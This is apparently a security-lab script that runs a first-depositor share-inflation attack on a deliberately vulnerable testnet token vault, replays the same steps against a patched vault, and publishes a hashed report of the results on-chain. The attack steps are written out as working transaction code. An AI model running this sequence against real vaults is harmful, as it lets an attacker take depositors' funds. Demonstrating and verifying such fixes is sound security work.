import { Contract, Wallet, encodeBytes32String, formatUnits, keccak256, toUtf8Bytes } from "ethers";
import { readFile, writeFile } from "node:fs/promises";
import {
  CHAIN_ID,
  EXPLORER_URL,
  MOCK_BOT_ADDRESS,
  PASSPORT_ADDRESS,
  RPC_URL,
  VULNERABLE_VAULT_ADDRESS,
  assertTestnet,
  loadEncryptedWallet,
  provider,
  readArtifact,
} from "./lib.mjs";

await assertTestnet();
const patchedDeployment = JSON.parse(
  await readFile("deployments/testnet/patched-vault.json", "utf8"),
);
const [owner, publisher, tokenArtifact, vaultArtifact, passportArtifact] = await Promise.all([
  loadEncryptedWallet(),
  loadEncryptedWallet("passport-publisher"),
  readArtifact("MockBOT"),
  readArtifact("VulnerableVault"),
  readArtifact("SimulationPassport"),
]);
const rpc = provider();
const token = new Contract(MOCK_BOT_ADDRESS, tokenArtifact.abi, owner);
const vulnerable = new Contract(VULNERABLE_VAULT_ADDRESS, vaultArtifact.abi, owner);
const patched = new Contract(patchedDeployment.contractAddress, vaultArtifact.abi, owner);
const passport = new Contract(PASSPORT_ADDRESS, passportArtifact.abi, publisher);

if ((await vulnerable.totalSupply()) !== 0n || (await vulnerable.totalAssets()) !== 0n) {
  throw new Error("Canonical vulnerable vault is not pristine; refusing a non-deterministic rerun.");
}

const victim = Wallet.createRandom().connect(rpc);
const transactionHashes = { attack: [], replay: [] };
const send = async (promise, bucket) => {
  const transaction = await promise;
  const receipt = await transaction.wait(1);
  bucket.push(receipt.hash);
  return receipt;
};
const ONE = 10n ** 18n;

await send(owner.sendTransaction({ to: victim.address, value: 20n * 10n ** 15n }), transactionHashes.attack);
await send(token.mint(owner.address, ONE * 3n + 2n), transactionHashes.attack);
await send(token.mint(victim.address, ONE * 2n), transactionHashes.attack);
await send(token.approve(VULNERABLE_VAULT_ADDRESS, ONE * 3n + 2n), transactionHashes.attack);
await send(vulnerable.deposit(1n, owner.address), transactionHashes.attack);
await send(token.transfer(VULNERABLE_VAULT_ADDRESS, ONE), transactionHashes.attack);
const victimToken = token.connect(victim);
await send(victimToken.approve(VULNERABLE_VAULT_ADDRESS, ONE), transactionHashes.attack);
await send(vulnerable.connect(victim).deposit(ONE, victim.address), transactionHashes.attack);
const vulnerableVictimShares = await vulnerable.balanceOf(victim.address);
await send(vulnerable.redeem(1n, owner.address), transactionHashes.attack);

await send(token.approve(patchedDeployment.contractAddress, ONE * 2n + 1n), transactionHashes.replay);
await send(patched.deposit(1n, owner.address), transactionHashes.replay);
await send(token.transfer(patchedDeployment.contractAddress, ONE), transactionHashes.replay);
await send(victimToken.approve(patchedDeployment.contractAddress, ONE), transactionHashes.replay);
await send(patched.connect(victim).deposit(ONE, victim.address), transactionHashes.replay);
const patchedVictimShares = await patched.balanceOf(victim.address);
if (vulnerableVictimShares !== 0n || patchedVictimShares === 0n) {
  throw new Error("Demo invariant did not reproduce as expected.");
}

const sourceCode = await rpc.getCode(VULNERABLE_VAULT_ADDRESS);
const sourceHash = keccak256(sourceCode);
const report = {
  finding: "CL-4626-001",
  protocol: VULNERABLE_VAULT_ADDRESS,
  vulnerableVictimShares: vulnerableVictimShares.toString(),
  patchedVictimShares: patchedVictimShares.toString(),
  attackTransactions: transactionHashes.attack,
  replayTransactions: transactionHashes.replay,
};
const reportHash = keccak256(toUtf8Bytes(JSON.stringify(report)));
const simulationId = keccak256(
  toUtf8Bytes(`crash-lab-canonical:${VULNERABLE_VAULT_ADDRESS}:${reportHash}`),
);
if (await passport.exists(simulationId)) {
  throw new Error("Canonical Passport already exists; refusing duplicate publication.");
}
const passportTransaction = await passport.publish(
  simulationId,
  VULNERABLE_VAULT_ADDRESS,
  sourceHash,
  reportHash,
  2,
  encodeBytes32String("crash-lab-1"),
);
const passportReceipt = await passportTransaction.wait(1);

const result = {
  network: { name: "BOT Chain Testnet", chainId: CHAIN_ID, rpcUrl: RPC_URL, explorerUrl: EXPLORER_URL },
  contracts: {
    passport: PASSPORT_ADDRESS,
    mockBot: MOCK_BOT_ADDRESS,
    vulnerableVault: VULNERABLE_VAULT_ADDRESS,
    patchedVault: patchedDeployment.contractAddress,
  },
  attack: {
    transactionHashes: transactionHashes.attack,
    victimShares: vulnerableVictimShares.toString(),
    attackerRecoveredAssets: formatUnits(ONE * 2n + 1n, 18),
  },
  replay: {
    transactionHashes: transactionHashes.replay,
    victimShares: patchedVictimShares.toString(),
    invariantHeld: true,
  },
  passport: {
    contractAddress: PASSPORT_ADDRESS,
    simulationId,
    reportHash,
    sourceHash,
    transactionHash: passportReceipt.hash,
    blockNumber: passportReceipt.blockNumber,
    publisher: publisher.address,
  },
  generatedAt: new Date().toISOString(),
};
const serialized = `${JSON.stringify(result, null, 2)}\n`;
await Promise.all([
  writeFile("deployments/testnet/canonical-demo-run.json", serialized),
  writeFile("src/data/canonical-run.json", serialized),
]);
process.stdout.write(serialized);
